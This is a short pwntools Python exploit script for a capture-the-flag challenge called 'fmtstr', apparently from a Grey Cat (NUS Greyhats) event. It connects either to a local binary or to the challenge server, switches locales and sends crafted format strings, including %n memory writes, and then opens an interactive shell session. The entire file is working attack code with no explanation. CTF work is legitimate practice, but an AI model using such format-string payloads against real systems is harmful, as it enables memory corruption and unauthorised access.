#!/usr/bin/python3

from pwn import *

exe = ELF('fmtstr', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('challs.nusgreyhats.org', 31234)
else:
    p = process(exe.path)
GDB()
def tmp(lan, fmt):
    sla(b'> ', b'2')
    sla(b': ', lan)
    sla(b'> ', b'1')
    sla(b': ', fmt)
tmp ("ga_IE.utf8", "%-%-%a%a%a%a%a%a%a%a")
tmp ("aa_DJ.utf8", "%n%n%n%B%B%B")

p.interactive()
